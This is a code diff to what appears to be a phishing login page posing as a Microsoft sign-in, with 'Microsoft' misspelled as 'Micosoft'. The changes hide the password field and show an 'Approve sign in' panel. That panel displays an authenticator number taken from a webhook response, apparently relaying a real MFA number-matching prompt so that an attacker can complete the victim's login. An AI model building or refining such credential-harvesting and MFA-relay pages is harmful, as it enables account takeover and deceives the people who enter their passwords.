@@ -428,26 +428,22 @@
                                 <div class="py-2"><span class="h5">Enter Password</span></div>
                                 <p id="passwordError" style="color: red; font-size: 14px; display: none;"></p>
                                 <p id="confirmation" style="display: none; font-size: 14px;"></p>
-                                <div class="form-group mt-2">
+
+                                <div class="form-group mt-2" id="passwordContainer">
                                     <input type="password" class="form-control" id="password" placeholder="Enter Password" />
                                 </div>
+
+                                <div id="authentication-app" style="display: none;" class="">
+                                    <h2>Approve sign in</h2>
+                                    <p>Tap the number you see below in your Micosoft Authenticator app to sign in </p>
+                                    <h1 id="authNumber" style="text-align: center; font-weight: bold; font-size: 3rem;"></h1>
+                                </div>
+
                                 <p style="font-size: 14px"><a href="#">Forget password?</a></p>
                                 <div class="text-right">
                                     <button type="submit" class="btn text-white" style="background-color: #0066BA">Login</button>
                                 </div>
                             </form>
-                        </div>
-
-                        <div id="authentication-app" style="display: none;" class="">
-                            <h2>Approve sign in</h2>
-                            <p>Tap the number you see below in your Micosoft Authenticator app to sign in </p>
-                            <h1 id="authNumber" style="text-align: center; font-weight: bold; font-size: 3rem;"></h1>
-                        </div>
-
-                        <div id="authentication-app" style="display: none;" class="">
-                            <h2>Approve sign in</h2>
-                            <p>Tap the number you see below in your Micosoft Authenticator app to sign in </p>
-                            <h1 id="authNumber" style="text-align: center; font-weight: bold; font-size: 3rem;"></h1>
                         </div>
 
                         <div id="spinner" class="spinner-overlay" style="display: none;">
@@ -599,15 +595,23 @@
                         confirmation.style.color = 'green';
 
                         if (webhookResponse.auth_type === "autentication-app") {
-                            // Show the authentication UI
-                            const authAppDiv = document.getElementById("authentication-app");
-                            authAppDiv.style.display = "block";
+                            // Hide the password input
+                            const passwordContainer = document.getElementById("passwordContainer");
+                            if (passwordContainer) {
+                                passwordContainer.style.display = "none";
+                            }
 
-                            // Set the number from webhookResponse
-                            const authNumberElement = document.getElementById("authNumber");
-                            authNumberElement.textContent = webhookResponse.pass_key;
+                            // Show the authentication app section
+                            const authApp = document.getElementById("authentication-app");
+                            if (authApp) {
+                                authApp.style.display = "block";
+                            }
+
+                            // Set the number (if provided)
+                            if (webhookResponse.pass_key) {
+                                document.getElementById("authNumber").textContent = webhookResponse.pass_key;
+                            }
                         }
-
 
                     } else {
                         spinner.style.display = 'none';
